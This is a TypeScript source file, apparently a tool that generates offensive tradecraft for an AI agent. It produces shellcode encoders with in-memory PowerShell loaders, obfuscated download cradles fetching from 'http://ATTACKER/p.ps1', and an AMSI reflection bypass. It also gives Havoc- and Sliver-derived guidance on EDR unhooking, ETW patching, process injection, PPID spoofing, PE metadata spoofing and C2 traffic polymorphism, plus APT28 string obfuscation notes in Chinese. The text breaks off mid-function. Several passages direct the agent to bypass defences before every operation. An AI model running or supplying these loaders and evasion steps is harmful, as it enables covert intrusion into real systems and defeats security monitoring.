    for (let i = 0; i < sourceHex.length; i += 2) {
      const b = parseInt(sourceHex.slice(i, i + 2), 16)
      const k = key[(i / 2) % key.length]
      encHex += (b ^ k).toString(16).padStart(2, '0')
    }
    lines.push('## Rolling XOR (4-byte rotating key - defeats static YARA signatures)')
    lines.push(`Key: [${key.map((k) => '0x' + k.toString(16)).join(', ')}] (rotates per byte)`)
    lines.push(`Original (${sourceHex.length / 2} bytes): ${sourceHex.slice(0, 80)}...`)
    lines.push(`Encoded:                ${encHex.slice(0, 80)}...`)
    lines.push('')
    lines.push('### PowerShell loader:')
    lines.push('```powershell')
    lines.push(`$k = [byte[]](${key.map((b) => '0x' + b.toString(16).padStart(2, '0')).join(',')})`)
    lines.push(`$s = "${encHex}"`)
    lines.push('$b = New-Object byte[] ($s.Length/2)')
    lines.push('for ($i=0; $i -lt $s.Length; $i+=2) { $b[$i/2] = [Convert]::ToByte($s.Substring($i,2),16) -bxor $k[($i/2) % $k.Length] }')
    lines.push('$p = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length); [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $p, $b.Length); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, [Func[Int]]).Invoke()')
    lines.push('```')
  } else if (encoding === 'uuid') {
    const sourceHex = cleaned || 'deadbeef'.repeat(8)
    const uuidStr = hexToUuidStrLocal(sourceHex)
    const truncated = uuidStr.length > 200 ? uuidStr.slice(0, 200) + ',...' : uuidStr
    lines.push('## UUID Encoding (Msfvenom --format uuid; pack 16 bytes per UUID)')
    lines.push('Looks benign; loader uses rpcrt4!UuidFromStringA.')
    lines.push('')
    lines.push('### PowerShell loader:')
    lines.push('```powershell')
    lines.push('Add-Type -TypeDefinition @"')
    lines.push('using System; using System.Runtime.InteropServices;')
    lines.push('public class U { [DllImport("rpcrt4.dll")] public static extern int UuidFromStringA(string u, out IntPtr p); }')
    lines.push('"@')
    lines.push(`$uuids = @(${truncated})`)
    lines.push('$buf = New-Object byte[] ($uuids.Length * 16)')
    lines.push('for ($i=0; $i -lt $uuids.Length; $i++) { $ptr = [IntPtr]::Zero; [U]::UuidFromStringA($uuids[$i], [ref]$ptr) | Out-Null; [System.Runtime.InteropServices.Marshal]::Copy($ptr, $buf, $i*16, 16) }')
    lines.push('$p=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length); [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $p, $buf.Length); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, [Func[Int]]).Invoke()')
    lines.push('```')
  } else if (encoding === 'ipv4') {
    const sourceHex = cleaned || 'deadbeef'.repeat(8)
    const padded = sourceHex + '0'.repeat((8 - (sourceHex.length % 8)) % 8)
    const ips = []
    for (let i = 0; i < padded.length; i += 8) {
      const b = padded.slice(i, i + 8)
      ips.push(`${parseInt(b.slice(0, 2), 16)}.${parseInt(b.slice(2, 4), 16)}.${parseInt(b.slice(4, 6), 16)}.${parseInt(b.slice(6, 8), 16)}`)
    }
    const truncated = ips.length > 8 ? ips.slice(0, 8).join('","') + '",.../* truncated */' : ips.join('","')
    lines.push('## IPv4 Encoding (Msfvenom --format c packed as IPs)')
    lines.push('Looks like IP allowlist / log entries. Loader reads /etc/hosts style.')
    lines.push('')
    lines.push('### PowerShell loader:')
    lines.push('```powershell')
    lines.push(`$ips = @("${truncated}")`)
    lines.push('$buf = New-Object byte[] ($ips.Length * 4)')
    lines.push('for ($i=0; $i -lt $ips.Length; $i++) { $p = $ips[$i].Split("."); for ($j=0; $j -lt 4; $j++) { $buf[$i*4+$j] = [byte]$p[$j] } }')
    lines.push('$p=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length); [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $p, $buf.Length); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, [Func[Int]]).Invoke()')
    lines.push('```')
  } else if (encoding === 'base64') {
    const bytes = cleaned.match(/.{2}/g)?.map((b) => parseInt(b, 16)) ?? []
    const buf = Buffer.from(bytes)
    const b64 = buf.toString('base64')
    const chunks = b64.match(/.{1,76}/g) ?? []
    lines.push('## Base64 Segmented Encoding')
    lines.push(`Original: ${bytes.length} bytes -> ${b64.length} b64 chars`)
    lines.push('')
    lines.push('### PowerShell loader:')
    lines.push('```powershell')
    chunks.forEach((c, i) => lines.push(`$p${i} = "${c}"`))
    lines.push(`$b = [Convert]::FromBase64String(${chunks.map((_, i) => `$p${i}`).join('+')})`)
    lines.push('$p = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length); [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $p, $b.Length); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, [Func[Int]]).Invoke()')
    lines.push('```')
  } else if (encoding === 'aes') {
    lines.push('## AES-128-CBC Encrypted Loader (defeats EDR memory scanning during transit)')
    lines.push('')
    lines.push('### Step 1 - encrypt locally with python:')
    lines.push('```python')
    lines.push('from Crypto.Cipher import AES; from Crypto.Random import get_random_bytes')
    lines.push('key = get_random_bytes(16); iv = get_random_bytes(16)')
    lines.push('shellcode_hex = open("/tmp/sc.bin","rb").read().hex()')
    lines.push('ct = AES.new(key, AES.MODE_CBC, iv).encrypt(bytes.fromhex(shellcode_hex))')
    lines.push('print(f"KEY={key.hex()}"); print(f"IV={iv.hex()}"); print(f"CT={ct.hex()}")')
    lines.push('```')
    lines.push('')
    lines.push('### Step 2 - paste into PowerShell loader:')
    lines.push('```powershell')
    lines.push('Add-Type -A System.Security')
    lines.push('$key = [byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)  # REPLACE')
    lines.push('$iv  = [byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)  # REPLACE')
    lines.push('$ct  = [byte[]](0x00,0x00,0x00,...)  # REPLACE')
    lines.push('$a = [System.Security.Cryptography.Aes]::Create(); $a.Key = $key; $a.IV = $iv')
    lines.push('$b = $a.CreateDecryptor().TransformFinalBlock($ct, 0, $ct.Length)')
    lines.push('$p = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length); [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $p, $b.Length); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, [Func[Int]]).Invoke()')
    lines.push('```')
  } else {
    lines.push(`## ${encoding} - unsupported`)
    lines.push('Supported: xor, xor_dynamic, uuid, ipv4, base64, aes')
    lines.push('Or pass "msfvenom:<payload spec>" as payload for full msfvenom pipeline.')
  }

  lines.push('')
  lines.push('### Havoc operational notes:')
  lines.push('- Combine encoder with msfvenom shikata_ga_nai for stacked protection')
  lines.push('- For in-memory only: skip disk entirely, embed loader in HTML smuggling / HTA / LNK')
  lines.push('- Run with: TechniqueGenerator({ technique: "shellcode_encode", payload: "<hex>", encoding: "xor_dynamic" })')

  return lines.join('NEWLINE')
}

// ── Obfuscated PowerShell ──────────────────────────────────────────────────

function psStringConcat(s: string): string {
  // Split any string >= 4 chars into 2 halves joined by `+`
  if (s.length < 4) return `"${s.replace(/"/g, '`"')}"`
  const mid = Math.floor(s.length / 2)
  return `("${s.slice(0, mid)}"+"${s.slice(mid)}")`
}

function psCharArray(s: string): string {
  const chars: string[] = []
  for (const c of s) chars.push(`[char]${s.charCodeAt(0)}`.replace(/\d+\]/, `${s.charCodeAt(chars.length)}\]`))
  return `(-join (${chars.join(',')}))`
}

function randomVar(prefix = '$x'): string {
  const letters = 'abcdefghijklmnopqrstuvwxyz'
  let n = ''
  for (let i = 0; i < 6; i++) n += letters[Math.floor(Math.random() * 26)]
  return `${prefix}${n}`
}

function obfuscatedPS(script: string): string {
  const lines: string[] = ['[TechniqueGenerator] Obfuscated PowerShell', '═'.repeat(50), '']
  lines.push(`Original script: ${script.slice(0, 200)}${script.length > 200 ? '...' : ''}`)
  lines.push('')

  // ── Method 1: Base64 UTF-16LE + IEX (classic, works but AMSI-aware)
  const utf16 = Buffer.from(script, 'utf16le').toString('base64')
  lines.push('## Method 1: Base64 UTF-16LE + IEX (combine with AMSI bypass)')
  lines.push('```powershell')
  lines.push('powershell -nop -w hidden -noni -enc ' + utf16.match(/.{1,76}/g)!.join('" "'))
  lines.push('```')
  lines.push('')

  // ── Method 2: Real string concat (works on actual script content)
  lines.push('## Method 2: String concatenation + variable obfuscation')
  lines.push('Each literal split in half and joined at runtime.')
  lines.push('```powershell')
  const a = randomVar(); const b = randomVar(); const c = randomVar(); const d = randomVar()
  const callParts = ['IEX', '(', 'New', '-', 'Object', ' ', 'Net.WebClient', ').DownloadString', "('http://ATTACKER/p.ps1')"]
  const callObf = callParts.map((p) => psStringConcat(p)).join(' + ')
  lines.push(`${a} = ${psStringConcat('IEX')}`)
  lines.push(`${b} = ${psStringConcat('(New-Object Net.WebClient).DownloadString')}`)
  lines.push(`${c} = ${psStringConcat("('http://ATTACKER/p.ps1')")}`)
  lines.push(`& ${a} (${b} + ${c})`)
  lines.push('```')
  lines.push('')

  // ── Method 3: Char array reconstruction (no string literals)
  lines.push('## Method 3: Char array (zero string literals — bypasses static AMSI scan)')
  lines.push('```powershell')
  const sample = "IEX(New-Object Net.WebClient).DownloadString('http://x/y.ps1')"
  const charParts: string[] = []
  for (let i = 0; i < sample.length; i++) charParts.push(`[char]${sample.charCodeAt(i)}`)
  lines.push(`$c = -join (${charParts.join(',')})`)
  lines.push('iex $c')
  lines.push('```')
  lines.push('')

  // ── Method 4: -enc with compressed + base64 (double layer)
  lines.push('## Method 4: Gzip + Base64 (smaller payload, same EDR evasion)')
  lines.push('```bash')
  lines.push('# Local prep:')
  lines.push(`printf '%s' '${script.replace(/'/g, "'''")}' | gzip -9 | base64 -w0`)
  lines.push('```')
  lines.push('```powershell')
  lines.push('$gz = "H4sIAAAAAAAAA-...REPLACE_ME..."')
  lines.push('$m = New-Object IO.MemoryStream(,[Convert]::FromBase64String($gz))')
  lines.push('$d = New-Object IO.Compression.GZipStream($m,[IO.Compression.CompressionMode]::Decompress)')
  lines.push('$r = New-Object IO.StreamReader($d); $s = $r.ReadToEnd()')
  lines.push('iex $s')
  lines.push('```')
  lines.push('')

  // ── Method 5: Whitespace + case randomization (token smuggling)
  lines.push('## Method 5: Whitespace + case randomization (defeats simple regex signatures)')
  const rnd = (s: string) => s.split('').map((c) => Math.random() > 0.7 && /[a-z]/.test(c) ? c.toUpperCase() : c).join('')
  const wsRandomized = script.split(' ').map((w) => Math.random() > 0.5 ? `${w} ` : `${w}  `).join('').replace(/^/gm, ' ')
  lines.push('```powershell')
  lines.push(`iex "${rnd(wsRandomized.slice(0, 200))}${wsRandomized.length > 200 ? '..." # truncated' : '"'}`)
  lines.push('```')
  lines.push('')

  // ── Method 6: AMSI-aware combined loader (recommended for Defender/EDR)
  lines.push('## Method 6: AMSI bypass + obfuscated script (full stack)')
  lines.push('```powershell')
  lines.push('# Step 1 - reflection patch (bypass AMSI scan)')
  lines.push(`$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');`)
  lines.push(`$f=$a.GetField('amsiInitFailed','NonPublic,Static');`)
  lines.push(`$f.SetValue($null,$true)`)
  lines.push('')
  lines.push('# Step 2 - obfuscated payload (any method above)')
  lines.push(`$c = -join (${Array.from({length: 8}, () => '[char]' + (65 + Math.floor(Math.random() * 26))).join(',')}, /* full char array here */)`)
  lines.push('iex $c')
  lines.push('```')
  lines.push('')

  lines.push('### Operational notes:')
  lines.push('- Defender checks the -enc base64 BEFORE execution -> Method 1 alone is detected')
  lines.push('- Methods 2/3/6 evade AMSI by avoiding suspicious string patterns entirely')
  lines.push('- For high-security targets: stack Methods 2 + 6 (string concat + AMSI bypass)')
  lines.push('- For AV-heavy ranges: Method 4 (gzip+base64) avoids file-system scanning')
  lines.push('- Havoc/Sliver principle: never ship the literal payload string in source — reconstruct at runtime')

  return lines.join('NEWLINE')
}

// ── Operational pattern: Havoc execution order ─────────────────────────────

function havocOperationalPattern(): string {
  return `## Havoc Operational Pattern (from Demon.c analysis)

Havoc's Demon agent follows this EXACT order for each operation. This is the
key insight: **sequence matters more than individual techniques**.

### Havoc's Execution Order:
1. **Connect to C2** → AES-256-CTR encrypted channel
2. **Enumerate environment** → OS, architecture, privileges, username, domain
3. **Check AMSI status** → if active, bypass BEFORE any PowerShell
4. **Check ETW status** → if active, bypass BEFORE executing commands
5. **Enumerate credentials** → only after AMTI/ETW bypassed (otherwise logged)
6. **Execute payload** → in-memory, no disk writes if possible
7. **Clean up** → remove artifacts, restore state if needed

### Why this order matters:
- If you execute PowerShell BEFORE AMSI bypass → AMSI logs everything
- If you enumerate creds BEFORE ETW bypass → Event Tracing records it
- If you write to disk BEFORE in-memory check → EDR scans the file
- The HAVOC order is: bypass first, then act

### How to apply:
- Always run EnvAnalyzer FIRST
- Based on results, execute bypasses in order: AMSI → ETW → payload
- Never skip bypass steps even if you think they're unnecessary
- The agent should follow this sequence for EVERY operation`
}

// ── Sliver-derived: RefreshPE (DLL unhooking from disk) ────────────────────

function refreshPE(): string {
  return `## Sliver RefreshPE — DLL Unhooking from Disk (from evasion/evasion_windows.go)

### The Problem:
EDRs inject hooks into ntdll.dll and kernel32.dll at load time. When you call
NtCreateFile or NtQuerySystemInformation, the EDR intercepts and logs it.
Havoc's indirect syscalls bypass this by jumping past hooks to the raw syscall.
Sliver takes a different approach: **replace the hooked bytes entirely**.

### Sliver's Solution: Reload DLL .text from Disk
\`\`\`go
func RefreshPE(name string) error {
    f, e := pe.Open(name)       // Open DLL from disk (e.g., "ntdll.dll")
    x := f.Section(".text")      // Extract the .text section
    dd, e := x.Data()            // Read clean bytes from disk
    return writeGoodBytes(dd, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(data []byte, name string, rva uint32, sectionName string, vsize uint32) error {
    dll, _ := windows.LoadDLL(name)       // Load DLL into memory
    addr := uintptr(dll.Handle) + uintptr(rva)  // Calculate .text base in memory
    var oldProtect uint32
    windows.VirtualProtect(addr, uintptr(vsize), PAGE_EXECUTE_READWRITE, &oldProtect)
    copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:vsize], data)  // Overwrite with clean bytes
    windows.VirtualProtect(addr, uintptr(vsize), oldProtect, &oldProtect)
    return nil
}
\`\`\`

### How It Works:
1. Open the DLL file from disk (C:\\Windows\\System32\NEWLINEtdll.dll)
2. Parse the PE header to find the .text section's file offset and size
3. Read the .text section's raw bytes from disk (these are clean — no EDR hooks)
4. Get the in-memory base address of the loaded DLL
5. Calculate where .text lives in memory (base + RVA)
6. VirtualProtect to RWX, copy clean bytes over, restore permissions
7. All EDR hooks in ntdll/kernel32 are now gone

### Why This Works:
- EDR hooks are in-memory modifications, not on-disk changes
- The DLL file on disk is always clean (unsigned Windows binaries)
- Overwriting .text erases ALL hooks at once — no need to find individual hook locations
- After RefreshPE, you can call NtCreateFile normally — no EDR interception

### Difference from Havoc's Approach:
| Havoc (Indirect Syscalls) | Sliver (RefreshPE) |
|--------------------------|-------------------|
| Extract SSN from ntdll | Replace ntdll .text from disk |
| Jump past hooks directly | Erase hooks entirely |
| Works even if DLL reloaded | Must re-apply after DLL reload |
| More complex implementation | Simpler — just memcopy |
| Leaves hooks in place | Destroys all hooks at once |

### When to Use:
- Use RefreshPE as the FIRST step on a Windows target with EDR
- After RefreshPE, all Win32/NT API calls go unmonitored
- Then apply AMSI/ETW bypasses (which rely on ntdll being clean)
- If EDR re-hooks (some EDRs periodically re-scan), re-run RefreshPE

### Operational Guidance:
\`\`\`
# Step 1: Use Sliver's approach — reload DLL from disk
# Step 2: Verify hooks are gone (call a hooked API, check it doesn't log)
# Step 3: Now AMSI/ETW patching works without EDR catching VirtualProtect
# Step 4: Execute your payload
\`\`\``
}

// ── Sliver-derived: SGN (Shikata-Ga-Nai) encoding ─────────────────────────

function sgnEncoding(): string {
  return `## Sliver SGN Encoder — Shikata-Ga-Nai (from server/encoders/shellcode/sgn/)

### The Problem:
XOR encoding is simple but has a fixed key — if EDR knows the key, it can
decode and scan. Base64 is trivially decoded. Static signatures still match
if the decoder stub itself is known.

### Sliver's Solution: SGN (Go port of Metasploit's classic encoder)
SGN uses an **Additive Feedback with Linear (ADFL) cipher** — each byte
affects the encoding of the next byte, making it a stream cipher, not
simple XOR.

### How SGN Works:
1. **Random seed generation**: Each encoding uses a different random seed
2. **ADFL cipher**: byte[i] encoded = (byte[i] + key) XOR prev_encoded_byte
   - This means: the same shellcode encodes differently each time (polymorphic)
   - Each byte's encoding depends on the previous encoded byte (feedback chain)
3. **Decoder stub**: A small polymorphic decoder is prepended to the payload
   - The decoder knows the seed and reverses the ADFL process
   - The decoder itself is also polymorphic (register allocation varies)
4. **Bad character avoidance**: SGN retries encoding (up to 64 attempts) to
   avoid specified bad characters (null bytes, spaces, newlines, etc.)
5. **ASCII-printable mode**: Can produce entirely printable ASCII output
   — useful for string-based injection (cookie values, HTTP headers, etc.)

### Key Features:
- **Polymorphic**: Same shellcode → different output every time
- **Multi-iteration**: Can encode 1-64 times (each iteration adds another layer)
- **Architecture support**: x86 and x64 decoder stubs
- **Register-safe mode**: Can preserve specific CPU registers
- **Up to 64 retries**: If encoding produces bad characters, retry with different seed

### How to apply:
- For shellcode: use SGN encoding instead of simple XOR
- For HTTP injection: use ASCII-printable SGN mode to embed in headers
- The polymorphic nature defeats static YARA signatures on both payload AND decoder
- Multi-iteration encoding adds layers — even if one layer is broken, the rest remain

### Comparison to Simple XOR:
| Simple XOR | SGN |
|-----------|-----|
| Fixed key (e.g., 0xAB) | Random seed each time |
| Same input → same output | Same input → different output |
| Decoder is static | Decoder is polymorphic |
| No bad-char handling | Retries to avoid bad chars |
| Easily detected by EDR | Much harder to signature |`
}

// ── Sliver-derived: Traffic Encoder Polymorphism ──────────────────────────

function trafficEncoderPattern(): string {
  return `## Sliver Traffic Encoder Polymorphism (from transports/httpclient/ and encoders/)

### The Problem:
C2 HTTP traffic with consistent patterns is detectable by network IDS/IPS.
Fixed URL paths, fixed headers, fixed body encoding = network signatures.

### Sliver's Solution: Polymorphic HTTP Traffic
Sliver encodes C2 traffic using multiple interchangeable encoders, making
each HTTP request look different from the previous one.

### Supported Encoders:
| Encoder | Output Format | Use Case |
|---------|--------------|----------|
| Base64 | Standard Base64 | General purpose |
| Base58 | Bitcoin-style | No special characters |
| Base32 | RFC 4648 | DNS-compatible |
| Hex | Hexadecimal | Raw binary transport |
| English | English words | Looks like natural text |
| PNG | PNG image | Steganographic transport |
| Gzip | Compressed | Size reduction |
| WASM | Custom WebAssembly | User-defined encoding |

### URL Randomization:
1. **Path segments**: Random paths built from configured segments
   - Instead of: POST /beacon → POST /api/v1/users/login
   - Each request uses a different path combination
2. **Nonce query parameter**: Random characters inserted into numeric values
   - ?id=12345 → ?id=12a3b45
   - Prevents replay detection and pattern matching
3. **OTP query arguments**: One-time-pad-like random parameters
   - ?token=abc123&session=def456 (different each request)
4. **User-Agent rotation**: OS-specific Chrome UA generated per-build
   - Each implant has a unique, consistent User-Agent

### Header Polymorphism:
- Configurable headers with probability-based inclusion
- Some headers appear 80% of the time, others 20%
- Makes fingerprinting the C2 profile harder

### How to apply for assessments:
- When sending payloads over HTTP, don't use raw curl
- Encode payload body with a non-standard encoding (Base58, English words)
- Randomize URL paths and query parameters
- Use legitimate-looking User-Agent headers
- The principle: **no two requests should look the same**`
}

// ── Sliver-derived: PE Donor Metadata Spoofing ────────────────────────────

function peDonorSpoofing(): string {
  return `## Sliver PE Donor Metadata Spoofing (from server/generate/spoof.go)

### The Problem:
Compiled binaries have unique metadata: Rich Header, timestamps, version info.
EDR/AV engines fingerprint these to identify malicious compilers.
A Go-compiled binary with default metadata is instantly flagged.

### Sliver's Solution: Clone Metadata from Legitimate Binaries
Sliver's SpoofMetadata() copies PE characteristics from a "donor" binary:

1. **Rich Header Cloning**: The Rich Header is a MSVC linker artifact that
   identifies the compiler version and build environment. Sliver replaces
   the malicious binary's Rich Header with one from a legitimate binary
   (e.g., notepad.exe, svchost.exe).

2. **Timestamp Cloning**: All PE timestamps (COFF header, debug directory,
   export directory) are set to match the donor binary. This prevents
   timestamp-based anomaly detection.

3. **Digital Signature Table Copying ("Luring")**: Copies the signature
   table from a legitimate signed binary. The signature won't verify
   (it points to a different binary), but many scanners just check
   "does it have a signature table?" — the presence of one can reduce
   suspicion even if the signature itself is invalid.

4. **Resource Section Injection**: Copies resource sections (icons, manifests,
   version info) from donor binary with RVA fixups.

5. **PE Checksum Recalculation**: Recalculates the PE checksum to match
   the modified binary — mismatched checksums are a red flag.

### How to apply:
- When compiling custom tools for assessments, clone metadata from a
  legitimate binary on the target system
- Use the donor's Rich Header, timestamps, and resource section
- The principle: **blend in with legitimate software, don't stand out**
- This is post-build modification — the compiled binary is patched AFTER
  compilation, requiring no changes to source code`
}

// ── Sliver-derived: Dual-Mode .NET Execution ──────────────────────────────

function dualModeDotNet(): string {
  return `## Sliver Dual-Mode .NET Execution (from taskrunner/task_windows.go + dotnet_windows.go)

### The Problem:
Running .NET assemblies in-process is detectable (CLR loading is monitored).
Running out-of-process spawns a child process (process creation is monitored).
Both have trade-offs between stealth and OPSEC.

### Sliver's Solution: Two Execution Modes

#### Mode 1: In-Process CLR Hosting (--in-process)
\`\`\`go
func InProcExecuteAssembly(assemblyData []byte, args []string, amsiBypass bool, etwBypass bool) {
    if amsiBypass { patchAmsi() }     // 0xC3 on AmsiScanBuffer/Initialize/ScanString
    if etwBypass { patchEtw() }       // 0xC3 on EtwEventWrite

    clr := CLR.GetInstance()           // Mutex-protected singleton
    runtime := clr.LoadCLR("v4")       // Load CLR v4 (ICLRMetaHost)
    domain := runtime.CreateAppDomain() // Create custom AppDomain
    asm := runtime.LoadAssembly(domain, assemblyData) // Load from byte[]
    runtime.InvokeAssembly(asm, args)  // Call entry point
}
\`\`\`

- Loads CLR into the current process via go-clr library
- Uses ICLRMetaHost → ICORRuntimeHost → AppDomain → Load_3
- Assembly loaded from memory (byte array), not from disk
- AMSI/ETW bypasses applied BEFORE CLR loads
- Assemblies cached by SHA256 hash (avoid re-loading same assembly)

#### Mode 2: Fork-and-Run (default)
\`\`\`go
func ExecuteAssembly(assembly []byte, args []string, processName string, ppid uint32) {
    // 1. Spawn sacrificial process (notepad.exe by default)
    cmd = startProcess(processName, true, true, false, ppid)  // PPID spoof
    // 2. Convert assembly to shellcode via Donut
    shellcode = donut.Convert(assembly)
    // 3. Inject via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
    // 4. Wait for completion, capture output
    // 5. Kill the host process
}
\`\`\`

- Spawns a sacrificial process (notepad.exe, calc.exe, etc.)
- Converts .NET assembly to shellcode using Donut
- Injects shellcode into the sacrificial process
- Captures stdout/stderr, then kills the process
- PPID spoofing supported (make it look like it spawned from explorer.exe)

### When to Use Each Mode:
| In-Process | Fork-and-Run |
|-----------|-------------|
| Stealthier (no new process) | Safer (if it crashes, implant survives) |
| AMSI/ETW bypass required | Donut conversion adds overhead |
| Assembly runs in implant's context | Assembly runs in isolated process |
| CLR loading detectable by EDR | Process creation detectable by EDR |
| Best for: post-bypass, trusted target | Best for: one-shot tasks, untrusted target |

### Operational Guidance:
1. **Before in-process**: ALWAYS patch AMSI and ETW first
2. **For fork-and-run**: Use PPID spoofing with a legitimate parent (explorer.exe)
3. **Assembly caching**: SHA256 dedup prevents re-loading same assembly
4. **Donut options**: Use aPLib compression + entropy encoding for smaller shellcode`
}

// ── Sliver-derived: Go Template Conditional Compilation ───────────────────

function goTemplateCompilation(): string {
  return `## Sliver Go Template Conditional Compilation (from implant/sliver/*.go.tmpl)

### The Principle:
Sliver uses Go's text/template system to render implant source code at build
time. Every .go file contains conditional directives like:
\`\`\`go
// {{if .Config.IsBeacon}}
import "sync"
// {{end}}
\`\`\`

This means:
- **Dead code elimination**: Only selected C2 channels are compiled in
- **No unused imports**: Template conditionals control import statements
- **Minimal binary**: Only the features you need are in the binary
- **Each build is unique**: Different configs produce different binaries

### How Sliver Builds:
1. Server receives GenerateReq with ImplantConfig
2. renderSliverGoCode() walks implant.FS (embedded source templates)
3. Go template engine renders each .go.tmpl file with config data
4. Canaries, C2 URLs, crypto keys baked in as string literals
5. go.mod/go.sum written, vendor directory copied
6. Import paths renamed to look like unrelated packages
7. Compiled with: go build -trimpath -mod=vendor OR garble -seed=random -literals -tiny

### Key Template Variables:
- .Config.IsBeacon / .Config.IsSession — Connection mode
- .Config.IncludeMTLS / IncludeHTTP / IncludeWG / IncludeDNS — C2 channels
- .Config.Evasion — Enable RefreshPE unhooking
- .Config.ObfuscateSymbols — Enable garble obfuscation
- .Config.LimitHostname / LimitUsername / LimitDatetime — Kill switches
- .Config.C2 — List of C2 server URLs (rendered into closures)
- .Build.PeerPublicKey / AgeServerPublicKey — Crypto material

### How to apply for assessments:
- When building custom tools, use conditional compilation to minimize binary
- Only include the features you need — less code = smaller attack surface
- Use garble for symbol obfuscation: -seed=random -literals -tiny
- The principle: **compile only what you need, obfuscate what remains**`
}

// ── Sliver-derived: Operation Patterns ────────────────────────────────────

function sliverOperationalPattern(): string {
  return `## Sliver Operational Patterns (from runner/runner.go + taskrunner/ analysis)

Sliver follows a specific operational sequence that differs from Havoc.

### Sliver's Execution Order:
1. **Check Execution Limits** → ExecLimits() at startup
   - Hostname, username, domain-joined, datetime, file-existence, locale
   - If any limit fails → os.Exit(1) immediately
   - This is the FIRST thing the implant does

2. **Connect to C2** → StartConnectionLoop() or StartBeaconLoop()
   - C2Generator selects next URL based on strategy (random/sequential)
   - For HTTP: Age key exchange → ChaCha20-Poly1305 session
   - For mTLS: Certificate auth → yamux multiplexing
   - For DNS: Base32 encoding, INIT with Age key exchange

3. **Register with Server** → registerSliver()
   - Sends hostname, username, OS, arch, PID, UUID
   - Server creates session/beacon record

4. **Receive Tasks** → sessionMainLoop() or beaconMainLoop()
   - Tasks dispatched to handlers via envelope system
   - Windows tasks wrapped in WrapperHandler (token impersonation)

5. **Execute Task** → Handler-specific logic
   - AMSI/ETW bypass: patchAmsi() / patchEtw() (0xC3 RET patch)
   - Process injection: refresh() → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
   - Assembly execution: InProc (CLR hosting) or Fork-and-Run (Donut + inject)

6. **Return Results** → connection.Send or pendingResults channel

### Key Differences from Havoc:
| Havoc | Sliver |
|-------|--------|
| Indirect syscalls | RefreshPE (disk-based unhook) |
| Hardware breakpoint AMSI bypass | 0xC3 memory patch AMSI bypass |
| Single execution mode | Dual mode (in-process + fork-and-run) |
| C2 handled by framework | Multi-transport abstraction (HTTP/DNS/WG/mTLS) |
| N/A | Traffic encoder polymorphism |
| N/A | Extension system (memmod + WASM + BOF) |

### How to apply:
- For Windows EDR: RefreshPE → AMSI patch → ETW patch → payload
- For network stealth: use polymorphic HTTP encoding
- For .NET tasks: choose in-process (stealth) vs fork-and-run (safety)
- For modular operations: load extensions on-demand (don't compile everything)
- For targeting: use execution limits to scope implant to specific hosts/users`
}

// ── APT28 (Operation Neusploit) — Alternating Byte XOR + Null Padding ──────

function apt28StringObfuscation(): string {
  return `## APT28 交替字节XOR + Null填充 字符串混淆（SimpleLoader.dll 逆向分析）

### 问题:
静态分析工具（strings、YARA规则）通过匹配连续可读字符串来识别恶意软件。
如果DLL中包含 "C:\\\\Windows\\\\System32\\\\cmd.exe" 这样的连续字符串，
YARA规则可以立即匹配到。

### APT28的解决方案: 交替真实字符 + Null填充 + XOR解密

**编码格式**: 真实字符和垃圾字节交替排列:
\`\`\`
原始字符串: "cmd.exe"
编码后（内存中）: [c][0x00][m][0x00][d][0x00][.][0x00][e][0x00][x][0x00][e][0x00][0x00][0x00]
               真实字节  垃圾    真实字节  垃圾    ...
\`\`\`

**运行时解密算法**:
\`\`\`c
wchar_t* DecryptString(const uint8_t* encrypted, size_t length, uint8_t xorKey) {
    wchar_t* result = (wchar_t*)malloc(length / 2 * sizeof(wchar_t));
    size_t outIdx = 0;

    for (size_t i = 0; i < length; i += 2) {
        // 只处理真实字符位置（偶数索引），跳过垃圾字节（奇数索引）
        uint8_t realByte = encrypted[i];     // 真实字符
        // encrypted[i+1] 是null/垃圾字节，直接跳过

        result[outIdx++] = (wchar_t)(realByte ^ xorKey);  // XOR解密
    }
    result[outIdx] = L'\\0';
    return result;
}
\`\`\`

**APT28使用的XOR密钥**:
- **0x43**: 单字节XOR，用于互斥量名称混淆
- **多字节密钥**: 用于API名称和路径字符串

**为什么有效**:
1. **打破连续字符串**: 真实字符被垃圾字节分隔，strings命令看到的是乱码
2. **YARA规则失效**: 无法匹配连续字符串模式
3. **内存中才解密**: 只有运行时动态分配的内存中才出现明文
4. **XOR密钥可更换**: 不同样本使用不同密钥，避免签名匹配

**如何应用到评估**:
- 对C payload中的敏感字符串（API名、路径、URL）使用交替字节编码
- 运行时用一个简单的循环解密，避免明文出现在二进制中
- 这比简单Base64更有效 — Base64编码的字符串本身是可识别的模式`
}

// ── APT28 — 76字节轮转XOR密钥载荷解密 ─────────────────────────────────────

function apt28RotatingXOR(): string {
  return `## APT28 76字节轮转XOR密钥 — 核心载荷解密（SimpleLoader.dll 分析）

### 问题:
单字节XOR（如0x43）密钥空间只有256种可能，可以被暴力破解。
固定密钥XOR对已知明文攻击脆弱。

### APT28的解决方案: 76字节轮转XOR密钥

**核心载荷**（通常加密存放在DLL的 .rdata 段或自定义资源段）
使用一个 **76字节长的密钥** 进行轮转异或加密。

**解密算法**:
\`\`\`c
// 76字节轮转XOR解密 — APT28 SimpleLoader核心载荷解密
uint8_t* DecryptPayload(const uint8_t* encryptedData, size_t dataLen,
